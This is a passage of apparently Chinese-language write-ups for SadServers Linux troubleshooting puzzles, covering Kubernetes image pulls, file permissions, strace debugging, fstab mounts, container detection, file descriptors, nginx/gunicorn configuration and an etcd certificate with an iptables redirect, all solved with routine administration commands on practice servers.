  CURRENT   READY   AGE\nreplicaset.apps/webapp-deployment-666b67994b   1         1         0       46d\n</code></pre> \u53ef\u4ee5\u53d1\u73b0 webapp-deployment \u7684\u955c\u50cf\u62c9\u53d6\u5931\u8d25\u4e86\u3002\u56e0\u4e3a\u5b83\u4f1a\u4ece\u7f51\u7edc\u62c9\u53d6 webapp \u955c\u50cf\u800c\u4e0d\u662f\u672c\u5730\uff0c\u800c\u6574\u4e2a sadservers \u4e0d\u80fd\u8fde\u63a5\u5916\u90e8\u7f51\u7edc\uff0c\u6240\u4ee5\u81ea\u7136\u4f1a\u62c9\u53d6\u5931\u8d25\u3002</p> <p>\u8fd9\u4e2a\u72b6\u6001\u548c\u524d\u4e00\u9635\u529e ZJUCTF \u6821\u8d5b\u5f88\u50cf\uff0c\u5927\u6982\u5c31\u662f k3s \u62c9\u53d6\u955c\u50cf\u7684\u95ee\u9898\u3002\u5f53\u65f6\u662f\u81ea\u5efa\u4e86\u4e00\u4e2a registry \u6765\u641e\u7684\u3002\u6240\u4ee5\u67e5\u4e00\u4e0b\u672c\u5730\u7684\u955c\u50cf\uff1a <pre><code>admin@ip-10-0-0-64:~$ sudo docker images\nREPOSITORY   TAG        IMAGE ID       CREATED        SIZE\nwebapp       latest     9c082e2983bc   6 weeks ago    135MB\npython       3.7-slim   c1d0bab51bbf   7 weeks ago    123MB\nregistry     2          3a0f7b0a13ef   2 months ago   24.1MB\n</code></pre> \u53d1\u73b0\u6b63\u597d\u6709 registry \u955c\u50cf\u3002\u6240\u4ee5\u672c\u5730\u8d77\u4e00\u4e2a registry \u7136\u540e\u5c06 webapp \u4e0a\u4f20\uff1a <pre><code>admin@ip-10-0-0-64:~$ sudo docker run -d -p 5000:5000 registry:2\n...\nadmin@ip-10-0-0-64:~$ sudo docker tag webapp localhost:5000/webapp\nadmin@ip-10-0-0-64:~$ sudo docker push localhost:5000/webapp\nUsing default tag: latest\nThe push refers to repository [localhost:5000/webapp]\n...\n</code></pre> \u7136\u540e\u6539\u4e00\u4e0b deployment.yml\uff1a <pre><code>...\ntemplate:\n    metadata:\n    labels:\n        app: webapp\n    spec:\n    containers:\n    - name: webapp\n        image: localhost:5000/webapp # \u8fd9\u91cc\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8888 # \u548c\u8fd9\u91cc\n</code></pre> \u7136\u540e\u5e94\u7528\uff1a <pre><code>admin@ip-10-0-0-64:~$ kubectl apply -f deployment.yml \ndeployment.apps/webapp-deployment configured\nadmin@ip-10-0-0-64:~$ kubectl get pods -n web\nNAME                                 READY   STATUS        RESTARTS   AGE\nwebapp-deployment-666b67994b-5sffz   0/1     Terminating   0          46d\nwebapp-deployment-8f869f757-g2m7n    1/1     Running       0          12s\n</code></pre> \u53ef\u4ee5\u53d1\u73b0\u6210\u529f\u542f\u52a8\u4e86\uff0c\u63a5\u4e0b\u6765\u7684\u5c31\u662f\u5c06\u5176\u4e2d\u7684 8888 \u7aef\u53e3\u8f6c\u53d1\u51fa\u6765\uff1a <pre><code>admin@ip-10-0-0-64:~$ kubectl port-forward deployments/webapp-deployment 8888 -n web &amp;\nForwarding from 127.0.0.1:8888 -&gt; 8888\nForwarding from [::1]:8888 -&gt; 8888\n...\n</code></pre> \u7136\u540e\u5728\u53e6\u4e00\u4e2a\u7ec8\u7aef\u91cc curl localhost:8888 \u5c31\u53ef\u4ee5\u5f97\u5230\u6b63\u5e38\u7ed3\u679c\u4e86\u3002</p>"},{"location":"writeups/sadservers/#karakorum","title":"\"Karakorum\"","text":"<p>Scenario: \"Karakorum\": WTFIT \u2013 What The Fun Is This?</p> <p>Level: Hard</p> <p>Description: There's a binary at /home/admin/wtfit that nobody knows how it works or what it does (\"what the fun is this\"). Someone remembers something about wtfit needing to communicate to a service in order to start. Run this wtfit program so it doesn't exit with an error, fixing or working around things that you need but are broken in this server. (Note that you can open more than one web \"terminal\").</p> <p>OS: Debian 11</p> <p>ls -l \u53ef\u4ee5\u770b\u51fa\u6765 wtfit \u6ca1\u6709\u8fd0\u884c\u6743\u9650\u3002\u6240\u4ee5\u5148 chmod\uff0c\u4f46 chmod \u4f1a\u62a5\u9519 bash: /usr/bin/chmod: Permission denied\u3002\u7ecf\u8fc7\u68c0\u67e5\u53ef\u4ee5\u53d1\u73b0\u662f /usr/bin/chmod \u81ea\u8eab\u4e5f\u6ca1\u6709\u8fd0\u884c\u6743\u9650\uff1a <pre><code>admin@ip-172-31-46-91:/$ ls -l /usr/bin/chmod\n-rw-r--r-- 1 root root 64448 Sep 24  2020 /usr/bin/chmod\n</code></pre> \u53ef\u4ee5\u641c\u7d22\u5230\u4e00\u4e9b\u89e3\u51b3\u529e\u6cd5\uff1a <pre><code>admin@ip-172-31-46-91:/$ sudo su\nroot@ip-172-31-46-91:/# /lib64/ld-linux-x86-64.so.2 /bin/chmod 755 /bin/chmod\nroot@ip-172-31-46-91:/# cd /home/admin/\nroot@ip-172-31-46-91:/home/admin# chmod +x wtfit\n</code></pre> \u8fd0\u884c wtfit \u51fa\u9519\uff1aERROR: can't open config file\u3002\u6839\u636e\u63d0\u793a\u901a\u8fc7 strace \u6765\u8ddf\u8e2a\u5f97\u5230\u9519\u8bef\u7684\u8be6\u7ec6\u6d88\u606f\uff1a <pre><code>admin@ip-172-31-46-91:~$ strace ./wtfit\n...\nopenat(AT_FDCWD, \"/home/admin/wtfitconfig.conf\", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)\n...\n</code></pre> \u5728\u8fd9\u4e2a\u4f4d\u7f6e\u521b\u5efa\u4e00\u4e2a\u7a7a\u7684\u914d\u7f6e\u6587\u4ef6\u3002\u7136\u540e\u518d\u8fd0\u884c\uff0c\u8fd8\u662f\u51fa\u9519\uff1aERROR: can't connect to server\u3002\u540c\u6837 strace \u53ef\u4ee5\u5f97\u5230\uff1a <pre><code>admin@ip-172-31-46-91:~$ strace ./wtfit\n...\nconnect(3, {sa_family=AF_INET, sin_port=htons(7777), sin_addr=inet_addr(\"127.0.0.1\")}, 16) = -1 EINPROGRESS (Operation now in progress)\n...\n</code></pre> \u6240\u4ee5\u53ef\u4ee5\u770b\u51fa\u5b83\u5728\u8bd5\u56fe\u8fde\u63a5 localhost:7777\u3002\u5f00\u4e00\u4e2a\u65b0\u7684 terminal \u7136\u540e\u76d1\u542c\u4e00\u4e0b 7777 \u7aef\u53e3\uff0c\u8fd0\u884c wtfit\uff1a <pre><code>admin@ip-172-31-46-91:/$ nc -lvvp 7777\nListening on 0.0.0.0 7777\nConnection received on localhost 54756\nGET / HTTP/1.1\nHost: localhost:7777\nUser-Agent: Go-http-client/1.1\nAccept-Encoding: gzip\n</code></pre> \u53ef\u4ee5\u53d1\u73b0\u5c31\u662f\u7b80\u5355\u7684 GET\uff0c\u6240\u4ee5 python \u8d77\u4e00\u4e2a http server\uff0c\u7136\u540e\u8fd0\u884c\uff1a <pre><code>admin@ip-172-31-46-91:/$ python3 -m http.server 7777\nServing HTTP on 0.0.0.0 port 7777 (http://0.0.0.0:7777/) ...\n127.0.0.1 - - [03/Nov/2022 12:58:30] \"GET / HTTP/1.1\" 200 -\n</code></pre> \u8fd9\u65f6 wtfit \u5c31\u53ef\u4ee5\u6b63\u5e38\u8fd0\u884c\u7ed3\u675f\u4e86\u3002</p>"},{"location":"writeups/sadservers/#hong-kong","title":"\"Hong-Kong\"","text":"<p>Scenario: \"Hong-Kong\": can't write data into database.</p> <p>Level: Hard</p> <p>Description: (Similar to \"Manhattan\" scenario but harder). Your objective is to be able to insert a row in an existing Postgres database. The issue is not specific to Postgres and you don't need to know details about it (although it may help).</p> <p>Postgres information: it's a service that listens to a port (:5432) and writes to disk in a data directory, the location of which is defined in the data_directory parameter of the configuration file /etc/postgresql/14/main/postgresql.conf. In our case Postgres is managed by systemd as a unit with name postgresql.</p> <p>OS: Debian 10</p> <p>\u548c\u524d\u9762\u7684 \"Manhattan\" \u7c7b\u4f3c\u3002\u8fd8\u662f\u5148\u68c0\u67e5\u72b6\u6001\u6ca1\u5f02\u5e38\uff0c\u91cd\u542f\u6ca1\u5f02\u5e38\uff0c\u67e5\u770b /var/log/syslog\uff0c\u53d1\u73b0\uff1a <pre><code>Nov  3 11:52:20 ip-172-31-25-11 systemd[1]: Starting PostgreSQL Cluster 14-main...\nNov  3 11:52:20 ip-172-31-25-11 postgresql@14-main[1318]: Error: /opt/pgdata/main is not accessible or does not exist\nNov  3 11:52:20 ip-172-31-25-11 systemd[1]: postgresql@14-main.service: Can't open PID file /run/postgresql/14-main.pid (yet?) after start: No such file or directory\nNov  3 11:52:20 ip-172-31-25-11 systemd[1]: postgresql@14-main.service: Failed with result 'protocol'.\nNov  3 11:52:20 ip-172-31-25-11 systemd[1]: Failed to start PostgreSQL Cluster 14-main.\n</code></pre></p> <p>\u627e\u4e0d\u5230 /opt/pgdata/main\uff0cls \u4e00\u4e0b /opt/pgdata \u4e5f\u6ca1\u6709\u3002\u518d\u5f80\u524d\u770b syslog \u53ef\u4ee5\u53d1\u73b0\uff1a <pre><code>Nov  3 11:47:54 ip-172-31-25-11 systemd[1]: dev-xvdb.device: Job dev-xvdb.device/start timed out.\nNov  3 11:47:54 ip-172-31-25-11 systemd[1]: Timed out waiting for device /dev/xvdb.\nNov  3 11:47:54 ip-172-31-25-11 systemd[1]: Dependency failed for /opt/pgdata.\nNov  3 11:47:54 ip-172-31-25-11 systemd[1]: opt-pgdata.mount: Job opt-pgdata.mount/start failed with result 'dependency'.\nNov  3 11:47:54 ip-172-31-25-11 systemd[1]: Startup finished in 2.669s (kernel) + 1min 31.106s (userspace) = 1min 33.776s.\nNov  3 11:47:54 ip-172-31-25-11 systemd[1]: dev-xvdb.device: Job dev-xvdb.device/start failed with result 'timeout'.\n</code></pre> \u53ef\u4ee5\u53d1\u73b0\u6302\u8f7d\u8bbe\u5907\u8d85\u65f6\u4e86\u3002</p> <p>fdisk \u770b\u4e00\u4e0b\uff1a <pre><code>root@ip-172-31-25-11:/# fdisk -l\nDisk /dev/nvme0n1: 8 GiB, 8589934592 bytes, 16777216 sectors\nDisk model: Amazon Elastic Block Store              \nUnits: sectors of 1 * 512 = 512 bytes\nSector size (logical/physical): 512 bytes / 512 bytes\nI/O size (minimum/optimal): 512 bytes / 512 bytes\n\n\nDisk /dev/nvme1n1: 8 GiB, 8589934592 bytes, 16777216 sectors\nDisk model: Amazon Elastic Block Store              \nUnits: sectors of 1 * 512 = 512 bytes\nSector size (logical/physical): 512 bytes / 512 bytes\nI/O size (minimum/optimal): 512 bytes / 512 bytes\nDisklabel type: gpt\nDisk identifier: 56507B41-5D22-1349-81AD-C628BA074922\n\nDevice           Start      End  Sectors  Size Type\n/dev/nvme1n1p1  262144 16777182 16515039  7.9G Linux filesystem\n/dev/nvme1n1p14   2048     8191     6144    3M BIOS boot\n/dev/nvme1n1p15   8192   262143   253952  124M EFI System\n\nPartition table entries are not in disk order.\nroot@ip-172-31-25-11:/# df\nFilesystem      1K-blocks    Used Available Use% Mounted on\nudev               228728       0    228728   0% /dev\ntmpfs               47568    1524     46044   4% /run\n/dev/nvme1n1p1    8026128 1230452   6366420  17% /\ntmpfs              237828       0    237828   0% /dev/shm\ntmpfs                5120       0      5120   0% /run/lock\ntmpfs              237828       0    237828   0% /sys/fs/cgroup\n/dev/nvme1n1p15    126710     278    126432   1% /boot/efi\n</code></pre> \u53ef\u4ee5\u53d1\u73b0 /dev/nvme0n1 \u6ca1\u6709\u6302\u8f7d\u4e0a\uff0c\u6839\u636e\u524d\u9762\u9898\u76ee\u53ef\u4ee5\u63a8\u6d4b\u8fd9\u4e2a\u8bbe\u5907\u91cc\u9762\u662f /opt/pgdata \u7684\u5185\u5bb9\u3002</p> <p><code>mount /dev/nvme0n1 /opt/pgdata</code> \u5c1d\u8bd5\u6302\u8f7d\uff0c\u6ca1\u6709\u62a5\u9519\uff0c\u4f46\u4ecd\u65e7\u6ca1\u6709\u4e1c\u897f\u3002\u770b\u4e00\u4e0b /var/log/syslog \u53d1\u73b0\uff1a <pre><code>Nov  3 12:02:06 ip-172-31-25-11 kernel: [  945.914667] SGI XFS with ACLs, security attributes, realtime, no debug enabled\nNov  3 12:02:06 ip-172-31-25-11 kernel: [  945.925395] XFS (nvme0n1): Mounting V5 Filesystem\nNov  3 12:02:07 ip-172-31-25-11 kernel: [  946.092049] XFS (nvme0n1): Ending clean mount\nNov  3 12:02:07 ip-172-31-25-11 systemd[1]: opt-pgdata.mount: Unit is bound to inactive unit dev-xvdb.device. Stopping, too.\nNov  3 12:02:07 ip-172-31-25-11 systemd[1]: Unmounting /opt/pgdata...\nNov  3 12:02:07 ip-172-31-25-11 kernel: [  946.124665] XFS (nvme0n1): Unmounting Filesystem\nNov  3 12:02:07 ip-172-31-25-11 systemd[1]: opt-pgdata.mount: Succeeded.\nNov  3 12:02:07 ip-172-31-25-11 systemd[1]: Unmounted /opt/pgdata.\n</code></pre></p> <p>\u53ef\u4ee5\u770b\u51fa systemd \u4e0d\u8ba9\u6211\u4eec\u6302\u8f7d\u5230 /opt/pgdata \u4e0a\uff0c\u56e0\u4e3a\u5b83\u548c /dev/xvdb \u8bbe\u5907\u5173\u8054\u4e86\u3002\u8fd9\u4e2a\u5173\u8054\u662f\u5728 /etc/fstab \u6587\u4ef6\u4e2d\u7684\uff1a <pre><code># /etc/fstab: static file system information\nUUID=5db68868-2d70-449f-8b1d-f3c769ec01c7 / ext4 rw,discard,errors=remount-ro,x-systemd.growfs 0 1\nUUID=72C9-F191 /boot/efi vfat defaults 0 0\n/dev/xvdb /opt/pgdata xfs defaults,nofail 0 0\n</code></pre> \u628a\u91cc\u9762\u7684 /dev/xvdb \u6362\u6210 /dev/nvme0n1\uff0c\u7136\u540e systemctl daemon-reload \u91cd\u65b0\u52a0\u8f7d\u914d\u7f6e\u6587\u4ef6\u3002\u4e4b\u540e\u5c31\u53ef\u4ee5\u6b63\u5e38 mount \u4e86\uff1a <pre><code>root@ip-172-31-25-11:/# systemctl daemon-reload\nroot@ip-172-31-25-11:/# ls /opt/pgdata\nroot@ip-172-31-25-11:/# mount /dev/nvme0n1 /opt/pgdata\nroot@ip-172-31-25-11:/# ls /opt/pgdata\ndeleteme  file1.bk  file2.bk  file3.bk  main\n</code></pre> \u540c\u6837\uff0c\u8fd9\u4e9b .bk \u6587\u4ef6\u5360\u6ee1\u4e86\u7a7a\u95f4\uff0c\u5220\u6389\u7136\u540e\u91cd\u542f postgresql\uff0c\u5c31\u53ef\u4ee5\u6b63\u5e38\u4f7f\u7528\u4e86\uff1a <pre><code>root@ip-172-31-25-11:/# ls -l /opt/pgdata\ntotal 8285620\n-rw-r--r--  1 root     root             69 May 21 22:20 deleteme\n-rw-r--r--  1 root     root     7516192768 May 21 22:06 file1.bk\n-rw-r--r--  1 root     root      967774208 May 21 22:17 file2.bk\n-rw-r--r--  1 root     root         499712 May 21 22:23 file3.bk\ndrwx------ 19 postgres postgres       4096 May 21 22:24 main\nroot@ip-172-31-25-11:/# rm /opt/pgdata/file*.bk\nroot@ip-172-31-25-11:/# sudo systemctl start postgresql\nroot@ip-172-31-25-11:/# sudo -u postgres psql -c \"insert into persons(name) values ('jane smith');\" -d dt\nINSERT 0 1\n</code></pre></p>"},{"location":"writeups/sadservers/#venice","title":"\"Venice\"","text":"<p>Scenario: \"Venice\": Am I in a container?</p> <p>Level: Medium</p> <p>Description: Try and figure out if you are inside a container (like a Docker one for example) or inside a Virtual Machine (like in the other scenarios).</p> <p>OS: Debian 11</p> <p>emmm\uff0cps -aux \u770b\u5230\uff1a <pre><code>root@ip-172-31-33-228:/# ps -aux\nUSER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nroot           1  0.4  2.0 100712  9600 ?        Ss   12:14   0:01 /sbin/init\nroot          22  0.0  1.4  26728  6912 ?        Ss   12:14   0:00 /lib/systemd/systemd-journald\nmessage+      47  0.0  0.7   8268  3700 ?        Ss   12:14   0:00 /usr/bin/dbus-daemon --system --addres\nroot          49  0.0  1.1  13404  5532 ?        Ss   12:14   0:00 /lib/systemd/systemd-logind\nroot          71  0.0  2.4 1230092 11584 ?       S&lt;sl 12:14   0:00 /usr/local/gotty --permit-write --reco\nroot          91  0.0  0.7   6056  3652 pts/0    S&lt;s  12:18   0:00 bash\nroot          92  0.0  0.7   8840  3416 pts/0    R&lt;+  12:18   0:00 ps -aux\n</code></pre> \u548c\u5176\u5b83\u9898\u76ee\u5b9e\u4f8b\u91cc\u9762\u4e0d\u4e00\u6837\uff0c\u6ca1\u6709 kernel thread\uff0c\u6240\u4ee5\u662f\u5bb9\u5668\u800c\u4e0d\u662f\u865a\u62df\u673a\u3002\uff08\u5c31\u8fd9\uff1f</p> \u9898\u7ed9\u7b54\u6848 <p>Solution: This is in fact a Podman container :-) You can get the image: docker.io/fduran/venice.</p> <p>A way of checking is by looking at the environment of the PID=1 process and see if there's a container variable, for ex: cat /proc/1/environ|tr \"\\0\" \"\\n\"|grep container , in our case would be container=podman but I changed its value.</p> <p>An indicator is to look at the running processes and see that there are no kernel threads like [kthreadd].</p>"},{"location":"writeups/sadservers/#oaxaca","title":"\"Oaxaca\"","text":"<p>Scenario: \"Oaxaca\": Close an Open File</p> <p>Level: Medium</p> <p>Description: The file /home/admin/somefile is open for writing by some process. Close this file without killing the process.</p> <p>OS: Debian 11</p> <p>lsof /home/admin/somefile \u53ef\u4ee5\u770b\u5230\u6709\u8fdb\u7a0b\u6253\u5f00\u4e86\u8fd9\u4e2a\u6587\u4ef6\uff1a <pre><code>COMMAND PID  USER   FD   TYPE DEVICE SIZE/OFF   NODE NAME\nbash    798 admin   77w   REG  259,1        0 272875 /home/admin/somefile\n</code></pre> ps -aux \u627e\u4e00\u901a\u53d1\u73b0\u8fd9\u4e2a PID \u5c31\u662f\u5f53\u524d\u7684 shell\u3002</p> <p>somefile \u65c1\u8fb9\u8fd8\u6709\u4e00\u4e2a openfile.sh\uff0c\u5185\u5bb9\u4e3a\uff1a <pre><code>#!/bin/bash\nexec 66&gt; /home/admin/somefile\n</code></pre> \u53ef\u4ee5\u63a8\u6d4b\u662f\u4ee5\u8fd9\u79cd\u65b9\u5f0f\u6253\u5f00\u7684\u6587\u4ef6\u3002\u901a\u8fc7\u524d\u9762 lsof \u7684\u7ed3\u679c\u77e5\u9053\u8fd9\u4e2a\u6587\u4ef6\u7684 fd \u4e3a 77\uff0c\u6216\u8005\u53ef\u4ee5\u901a\u8fc7 proc \u6765\u9a8c\u8bc1\u4e00\u4e0b\uff1a <pre><code>$ ls -l /proc/self/fd\ntotal 0\nlrwx------ 1 admin admin 64 Dec 24 04:47 0 -&gt; /dev/pts/0\nlrwx------ 1 admin admin 64 Dec 24 04:47 1 -&gt; /dev/pts/0\nlrwx------ 1 admin admin 64 Dec 24 04:47 2 -&gt; /dev/pts/0\nlr-x------ 1 admin admin 64 Dec 24 04:47 3 -&gt; /proc/819/fd\nl-wx------ 1 admin admin 64 Dec 24 04:47 77 -&gt; /home/admin/somefile\n</code></pre> \u7136\u540e\u540c\u6837\u4f7f\u7528 exec \u5173\u6389 77 fd \u5c31\u597d\u4e86\uff1a <pre><code>$ exec 77&gt;&amp;-\n</code></pre></p>"},{"location":"writeups/sadservers/#melbourne","title":"\"Melbourne\"","text":"<p>Scenario: \"Melbourne\": WSGI with Gunicorn</p> <p>Level: Medium</p> <p>Description: There is a Python WSGI web application file at /home/admin/wsgi.py , the purpose of which is to serve the string \"Hello, world!\". This file is served by a Gunicorn server which is fronted by an nginx server (both servers managed by systemd). So the flow of an HTTP request is: Web Client (curl) -&gt; Nginx -&gt; Gunicorn -&gt; wsgi.py . The objective is to be able to curl the localhost (on default port :80) and get back \"Hello, world!\", using the current setup.</p> <p>OS: Debian 11</p> <p>\u9996\u5148 curl -v http://localhost \u770b\u4e00\u4e0b\uff0c\u53d1\u73b0 Connection refused\uff1a <pre><code>admin@ip-172-31-32-71:~$ curl -v http://localhost\n*   Trying 127.0.0.1:80...\n* connect to 127.0.0.1 port 80 failed: Connection refused\n* Failed to connect to localhost port 80: Connection refused\n* Closing connection 0\ncurl: (7) Failed to connect to localhost port 80: Connection refused\n</code></pre> \u67e5\u8be2\u4e00\u4e0b nginx \u72b6\u6001\uff0c\u53d1\u73b0\u662f\u6ca1\u6709\u5f00\u542f\uff0c\u6240\u4ee5 sudo \u91cd\u542f\uff1a <pre><code>admin@ip-172-31-32-71:~$ systemctl status nginx\n\u25cf nginx.service - A high performance web server and a reverse proxy server\n     Loaded: loaded (/lib/systemd/system/nginx.service; disabled; vendor preset:&gt;\n     Active: inactive (dead)\n       Docs: man:nginx(8)\nadmin@ip-172-31-32-71:~$ sudo systemctl start nginx\nadmin@ip-172-31-32-71:~$ systemctl status nginx.service\n\u25cf nginx.service - A high performance web server and a reverse proxy server\n     Loaded: loaded (/lib/systemd/system/nginx.service; disabled; vendor preset: enabled)\n     Active: active (running) since Sat 2022-12-24 05:09:46 UTC; 3s ago\n       Docs: man:nginx(8)\n    Process: 850 ExecStartPre=/usr/sbin/nginx -t -q -g daemon on; master_process on; (code=exited, status=0/SUCCESS)\n    Process: 851 ExecStart=/usr/sbin/nginx -g daemon on; master_process on; (code=exited, status=0/SUCCESS)\n   Main PID: 852 (nginx)\n      Tasks: 3 (limit: 524)\n     Memory: 3.1M\n        CPU: 36ms\n     CGroup: /system.slice/nginx.service\n             \u251c\u2500852 nginx: master process /usr/sbin/nginx -g daemon on; master_process on;\n             \u251c\u2500853 nginx: worker process\n             \u2514\u2500854 nginx: worker process\n</code></pre> \u53ef\u4ee5\u6b63\u5e38\u91cd\u542f\uff0c\u4f46\u8fd9\u65f6 curl \u4f1a\u51fa\u73b0 502\u3002\u770b\u4e00\u4e0b /etc/nginx/sites-enabled/default \u91cc\u7684\u914d\u7f6e\uff1a <pre><code>server {\n    listen 80;\n\n    location / {\n        include proxy_params;\n        proxy_pass http://unix:/run/gunicorn.socket;\n    }\n}\n</code></pre> \u53d1\u73b0\u53ea\u6709 proxy_pass \u90a3\u53e5\u53ef\u80fd\u51fa\u95ee\u9898\u3002systemctl \u67e5\u8be2\u4e00\u4e0b gunicorn \u72b6\u6001\uff1a <pre><code>admin@ip-172-31-32-71:~$ systemctl status gunicorn\n\u25cf gunicorn.service - gunicorn daemon\n     Loaded: loaded (/etc/systemd/system/gunicorn.service; enabled; vendor preset: enabled)\n     Active: active (running) since Sat 2022-12-24 05:01:16 UTC; 10min ago\nTriggeredBy: \u25cf gunicorn.socket\n   Main PID: 550 (gunicorn)\n      Tasks: 2 (limit: 524)\n     Memory: 17.1M\n        CPU: 348ms\n     CGroup: /system.slice/gunicorn.service\n             \u251c\u2500550 /usr/bin/python3 /usr/local/bin/gunicorn --bind unix:/run/gunicorn.sock wsgi\n             \u2514\u2500612 /usr/bin/python3 /usr/local/bin/gunicorn --bind unix:/run/gunicorn.sock wsgi\n\nDec 24 05:01:16 ip-172-31-32-71 systemd[1]: Started gunicorn daemon.\nDec 24 05:01:17 ip-172-31-32-71 gunicorn[550]: [2022-12-24 05:01:17 +0000] [550] [INFO] Starting gunicorn 20.1.0\nDec 24 05:01:17 ip-172-31-32-71 gunicorn[550]: [2022-12-24 05:01:17 +0000] [550] [INFO] Listening at: unix:/run/gunicorn.sock (550)\nDec 24 05:01:17 ip-172-31-32-71 gunicorn[550]: [2022-12-24 05:01:17 +0000] [550] [INFO] Using worker: sync\nDec 24 05:01:17 ip-172-31-32-71 gunicorn[612]: [2022-12-24 05:01:17 +0000] [612] [INFO] Booting worker with pid: 612\n</code></pre> \u53ef\u4ee5\u770b\u51fa\u5b9e\u9645\u4e0a\u662f\u7ed1\u5b9a\u5728 /run/gunicorn.sock \u4e0a\u4e86\uff0c/run/gunicorn.socket \u5e76\u4e0d\u5b58\u5728\u3002\u6240\u4ee5\u4fee\u6539 nginx \u7684\u914d\u7f6e\u7136\u540e restart\u3002\u8fd9\u65f6 curl \u4e0d\u4f1a\u62a5\u9519\uff0c\u4f46\u6ca1\u6709\u5185\u5bb9\uff0c-v \u8f93\u51fa\uff1a <pre><code>admin@ip-172-31-32-71:~$ curl -v http://localhost\n*   Trying 127.0.0.1:80...\n* Connected to localhost (127.0.0.1) port 80 (#0)\n&gt; GET / HTTP/1.1\n&gt; Host: localhost\n&gt; User-Agent: curl/7.74.0\n&gt; Accept: */*\n&gt; \n* Mark bundle as not supporting multiuse\n&lt; HTTP/1.1 200 OK\n&lt; Server: nginx/1.18.0\n&lt; Date: Sat, 24 Dec 2022 05:13:05 GMT\n&lt; Content-Type: text/html\n&lt; Content-Length: 0\n&lt; Connection: keep-alive\n&lt; \n* Connection #0 to host localhost left intact\n</code></pre> \u53ef\u4ee5\u770b\u5230\u662f 200\uff0c\u4f46\u8fd9\u91cc Response \u91cc\u6709 Content-Length: 0\uff0c\u6240\u4ee5\u4ec0\u4e48\u90fd\u6ca1\u5f97\u5230\u3002\u53d1\u73b0\u8fd9\u4e2a\u662f\u5199\u5728 wsgi.py \u91cc\u7684\uff1a <pre><code>admin@ip-172-31-32-71:~$ cat wsgi.py \ndef application(environ, start_response):\n    start_response('200 OK', [('Content-Type', 'text/html'), ('Content-Length', '0'), ])\n    return [b'Hello, world!']\n</code></pre> \u6240\u4ee5\u628a ('Content-Length', '0') \u53bb\u6389\uff0c\u7136\u540e sudo systemctl restart gunicorn \u91cd\u542f\uff0c\u8fd9\u6b21\u518d curl \u5c31\u6b63\u5e38\u4e86\uff1a <pre><code>admin@ip-172-31-32-71:~$ curl -s http://localhost\nHello, world!\n</code></pre></p>"},{"location":"writeups/sadservers/#lisbon","title":"\"Lisbon\"","text":"<p>Scenario: \"Lisbon\": etcd SSL cert troubles</p> <p>Level: Medium</p> <p>Description: There's an etcd server running on https://localhost:2379 , get the value for the key \"foo\", ie <code>etcdctl get foo</code> or <code>curl https://localhost:2379/v2/keys/foo</code></p> <p>OS: Debian 11</p> <p>\u9996\u5148\u8dd1\u4e00\u4e0b <code>etcdctl get goo</code> \u8bd5\u8bd5\u770b\uff0c\u5f97\u5230\u62a5\u9519\uff1a <pre><code>admin@ip-10-0-0-138:/$ etcdctl get foo\nError:  client: etcd cluster is unavailable or misconfigured; error #0: x509: certificate has expired or is not yet valid: current time 2024-02-20T02:49:48Z is after 2023-01-30T00:02:48Z\n\nerror #0: x509: certificate has expired or is not yet valid: current time 2024-02-20T02:49:48Z is after 2023-01-30T00:02:48Z\n</code></pre></p> <p>\u53ef\u89c1\u662f\u8bc1\u4e66\u8fc7\u671f\u4e86\uff0c\u800c\u4e14\u5f53\u524d\u65f6\u95f4\u662f\u5728 24 \u5e74\uff0c\u76f4\u63a5 <code>sudo date -s 20230101</code> \u4fee\u6539\u65e5\u671f\u5230\u8bc1\u4e66\u8fc7\u671f\u524d\u5c31\u53ef\u4ee5\u3002</p> <p>\u63a5\u7740\u518d\u8fd0\u884c\u53ef\u4ee5\u5f97\u5230\uff1a <pre><code>admin@ip-10-0-0-138:/$ etcdctl get foo\nError:  client: response is invalid json. The endpoint is probably not valid etcd cluster endpoint.\nadmin@ip-10-0-0-138:/$ curl https://localhost:2379/v2/keys/foo\n&lt;html&gt;\n&lt;head&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt;\n&lt;body&gt;\n&lt;center&gt;&lt;h1&gt;404 Not Found&lt;/h1&gt;&lt;/center&gt;\n&lt;hr&gt;&lt;center&gt;nginx/1.18.0&lt;/center&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre></p> <p>\u8fd9\u4e2a curl \u7684 404 \u7ed3\u679c\u662f nginx \u7684\u5c31\u6bd4\u8f83\u602a\uff0c\u6240\u4ee5 curl \u4e86\u4e00\u4e0b\u6839\u9875\u9762\uff1a <pre><code>admin@ip-10-0-0-138:/$ curl https://localhost:2379/\nTesting SSL\nadmin@ip-10-0-0-138:/$ curl https://localhost:443/\nTesting SSL\nadmin@ip-10-0-0-138:/$ cat /var/www/html/index.html \nTesting SSL\n</code></pre></p> <p>\u53ef\u4ee5\u731c\u6d4b 2379 \u7aef\u53e3\u88ab\u91cd\u5b9a\u5411\u5230 nginx \u7684 443 \u7aef\u53e3\u4e0a\u4e86\uff0c\u770b\u4e86\u4e0b <code>/etc/nginx/sites-enabled/default</code> \u5e76\u6ca1\u6709 2379 \u7aef\u53e3\u76f8\u5173\u8bbe\u7f6e\uff0cnetstat \u4e5f\u53ea\u53ef\u4ee5\u770b\u5230\u5360\u7528\u60c5\u51b5\uff0c2379 \u786e\u5b9e\u5728\u7528\u3002\u63a5\u4e0b\u6765\u770b\u770b iptables\uff1a <pre><code>admin@ip-10-0-0-138:/$ sudo iptables -t nat -L\nChain PREROUTING (policy ACCEPT)\ntarget     prot opt source               destination         \nDOCKER     all  --  anywhere             anywhere             ADDRTYPE match dst-type LOCAL\n\nChain INPUT (policy ACCEPT)\ntarget     prot opt source               destination         \n\nChain OUTPUT (policy ACCEPT)\ntarget     prot opt source               destination         \nREDIRECT   tcp  --  anywhere             anywhere             tcp dpt:2379 redir ports 443\nDOCKER     all  --  anywhere            !ip-127-0-0-0.us-east-2.compute.internal/8  ADDRTYPE match dst-type LOCAL\n\nChain POSTROUTING (policy ACCEPT)\ntarget     prot opt source               destination         \nMASQUERADE  all  --  ip-172-17-0-0.us-east-2.compute.internal/16  anywhere            \n\nChain DOCKER (2 references)\ntarget     prot opt source               destination         \nRETURN     all  --  anywhere             anywhere\n</code></pre> \u53ef\u4ee5\u53d1\u73b0 <code>tcp dpt:2379 redir ports 443</code>\uff0c\u6240\u4ee5\u6700\u7b80\u5355\u7684\u65b9\u6cd5\u76f4\u63a5 -F flush \u6389\u8fd9\u4e9b rules \u5c31\u597d\uff1a 